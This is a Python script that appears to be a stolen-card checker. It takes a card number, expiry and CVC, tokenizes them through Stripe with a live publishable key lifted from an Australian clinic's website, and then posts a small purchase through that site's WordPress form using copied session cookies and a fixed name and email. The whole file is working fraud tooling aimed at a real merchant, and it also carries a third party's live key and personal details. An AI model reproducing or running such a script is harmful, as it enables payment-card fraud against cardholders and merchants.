import requests,re
def Tele(ccx):
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    r = requests.session()

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1577ab39-f384-4718-b602-8c6e2a851115547985&muid=e6dbcd53-5636-47a5-85cd-b7ae57010b1cde4b59&sid=14a9b7c0-dc1c-472b-a6c7-25a769dd4f57571bea&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fwww.scalemyclinic.com.au&time_on_page=44805&key=pk_live_51E2Ww6F9r7TSmQGmNU8H8p6YpMQspBCpP7YknufmRvQ4UNZXOqKCYehH0UOThW3MlLzutrsusEreIP67PDcnWsCC00IjdSyFac'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:     
        id = response.json()['id']
    except:
        pass


    cookies = {
    'nitroImpactGroup': '26',
    'nitroCachedPage': '1',
    'referral_page': 'https%3A%2F%2Fwww.scalemyclinic.com.au%2Fbook%2Fthe-successful-general-practice%2Fracgp%2Fpurchase%2F',
    'form_p2c191758f178': '1',
    'utm_source': 'direct',
    'pbid': '9e90bfa98abf36d9387276ad4dabd281c5b34574b0a2780ab29c02c283181ada',
    'pys_session_limit': 'true',
    'pys_start_session': 'true',
    'pys_first_visit': 'true',
    'pysTrafficSource': 'direct',
    'pys_landing_page': 'https://www.scalemyclinic.com.au/book/the-successful-general-practice/racgp/purchase/',
    'last_pysTrafficSource': 'direct',
    'last_pys_landing_page': 'https://www.scalemyclinic.com.au/book/the-successful-general-practice/racgp/purchase/',
    '_fbp': 'fb.1.1735208821456.7223589069',
    '_gid': 'GA1.3.418657987.1735208823',
    '_gat_gtag_UA_140160469_35': '1',
    '_gat_UA-140160469-35': '1',
    '_ga_5SXMKHBEXV': 'GS1.1.1735208822.1.0.1735208822.60.0.0',
    '_ga': 'GA1.1.1790287993.1735208820',
    '_gcl_au': '1.1.1355306659.1735208823',
    'rtkclickid-store': '676d2f777033ca5653154188',
    '_hjSessionUser_2303470': 'eyJpZCI6IjdhODljNjU4LTQ4ZGEtNWU5ZS1hNmMyLTU5OTA5ZmI5Y2Y1OSIsImNyZWF0ZWQiOjE3MzUyMDg4MjQxNjcsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_2303470': 'eyJpZCI6IjExMzBjZDAwLTNkOGItNDU3Mi04NWQ0LWQ5NTA0YWVkNDIyMyIsImMiOjE3MzUyMDg4MjQxNzcsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '__hstc': '255723607.58145f64eaa7b570815b6c5998c059e1.1735208826976.1735208826976.1735208826976.1',
    'hubspotutk': '58145f64eaa7b570815b6c5998c059e1',
    '__hssrc': '1',
    '__hssc': '255723607.1.1735208826978',
    '__stripe_mid': 'e6dbcd53-5636-47a5-85cd-b7ae57010b1cde4b59',
    '__stripe_sid': '14a9b7c0-dc1c-472b-a6c7-25a769dd4f57571bea',
    '_ga_QFL5K4K9FY': 'GS1.1.1735208820.1.1.1735208864.0.0.0',
}

    headers = {
    'authority': 'www.scalemyclinic.com.au',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.scalemyclinic.com.au',
    'referer': 'https://www.scalemyclinic.com.au/book/the-successful-general-practice/racgp/purchase/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    't': '1735208865509',
}

    data = {
    'data': f'__fluent_form_embded_post_id=25644&_fluentform_10_fluentformnonce=73bf6aa0ac&_wp_http_referer=%2Fbook%2Fthe-successful-general-practice%2Fracgp%2Fpurchase%2F&reg_date=12%2F26%2F2024&names%5Bfirst_name%5D=Thu&names%5Blast_name%5D=Kyi&email=thur07656%40gmail.com&payment_input=12.97&payment_method=stripe&__stripe_payment_method_id={id}',
    'action': 'fluentform_submit',
    'form_id': '10',
}

    r2 = requests.post(
    'https://www.scalemyclinic.com.au/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
    return (r2.json())